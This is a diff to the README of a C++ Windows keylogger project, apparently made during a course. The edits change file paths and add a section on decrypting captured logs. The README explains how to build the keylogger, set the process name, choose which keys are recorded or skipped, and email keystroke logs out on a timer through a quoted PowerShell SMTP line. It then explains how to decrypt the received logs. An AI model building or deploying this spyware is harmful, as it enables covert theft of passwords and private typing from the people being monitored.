@@ -15,7 +15,7 @@ If you would like to take the course yourself, check it out [here](https://www.u
     * Name of the process
     * Email to send from and send to
     * Time between each log file generation
-    * Format which the keys are recorded
+    * Format how keys are recorded
     * Keys to exclude from recording
     
 ## Important Information
@@ -47,13 +47,13 @@ git clone https://github.com/htmercury/Cpp-Keylogger
 Open the solution file in Visual Studio using the sln file
 
 ```
-located at ../Cpp-Keylogger/Keylogger.sln
+located at ..\Cpp-Keylogger\Keylogger.sln
 ```
 
 For other IDEs, make a project that includes all source and header files
 
 ```
-located at ../Cpp-Keylogger/Keylogger
+located at ..\Cpp-Keylogger\Keylogger
 ```
 
 ## Setting it up
@@ -64,7 +64,7 @@ Required if user wants the log to be sent to an email.
 
 Open SendMail.h
 ```
-located at ../Cpp-Keylogger/Keylogger/SendMail.h
+located at ..\Cpp-Keylogger\Keylogger\SendMail.h
 ```
 Edit line 16 for where the log should be sent from (default: gmail only, look at Other Emails section for changing that)
 ```
@@ -90,12 +90,36 @@ OPTIONAL: If you want to use another email other than gmail as the source email,
 
 Open SendMail.h
 ```
-located at ../Cpp-Keylogger/Keylogger/SendMail.h
+located at ..\Cpp-Keylogger\Keylogger\SendMail.h
 ```
 Edit line 39 with your email port number which can be searched up
 ```
 line 39: "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
 ```
+## Decrypting the log files
+Follow these steps to decrypt any received log files
+
+Open the Decryption program solution with Visual Studio
+```
+located at ..\Cpp-Keylogger\Keylogger-Decrypt.sln
+```
+For other IDEs, make a project that includes all source files
+```
+located at ..\Cpp-Keylogger\Keylogger-Decrypt\
+```
+Build the solution, and find the exe (default: located at ../Cpp-Keylogger/Debug)
+```
+located at ..\Cpp-Keylogger\Debug\Keylogger-Decrypt.exe
+```
+Open a command prompt window at that directory
+```
+cd ..\Cpp-Keylogger\Debug\
+```
+Run the decryption program which takes in a input file and a output file which contains the decrypted contents
+```
+.\Keylogger-Decrypt.exe "inputfile.log" "outputfile.log"
+```
+
 
 ## Customization
 OPTIONAL changes the user can make to the source code to fit their needs.
@@ -106,7 +130,7 @@ The name of the process can simply be changed by renaming the .exe file of the b
 Build the solution
 ```
 Build -> Build Solution
-The .exe file should be located by default in ../Cpp-Keylogger/Debug/Keylogger.exe
+The .exe file should be located by default in ..\Cpp-Keylogger\Debug\Keylogger.exe
 ```
 Rename the built Keylogger.exe file
 
@@ -115,7 +139,7 @@ Here, the user can set the interval at which each log file is created and sent
 
 Open KeybHook.h
 ```
-located at ../Cpp-Keylogger/Keylogger/KeybHook.h
+located at ..\Cpp-Keylogger\Keylogger\KeybHook.h
 ```
 Edit line 36 with the desired time (default is 30 seconds)
 ```
@@ -126,7 +150,7 @@ Here, the user can set how the log file formats the read keys
 
 Open Helper.h
 ```
-located at ../Cpp-Keylogger/Keylogger/Helper.h
+located at ..\Cpp-Keylogger\Keylogger\Helper.h
 ```
 Edit lines 77 - 83 to change how single keys are formated
 ```
@@ -138,7 +162,7 @@ Here, the user can exclude keys they don't want to be logged
 
 Open KeybHook.h
 ```
-located at ../Cpp-Keylogger/Keylogger/KeybHook.h
+located at ..\Cpp-Keylogger\Keylogger\KeybHook.h
 ```
 Take a look at lines 40 - 72
 ```
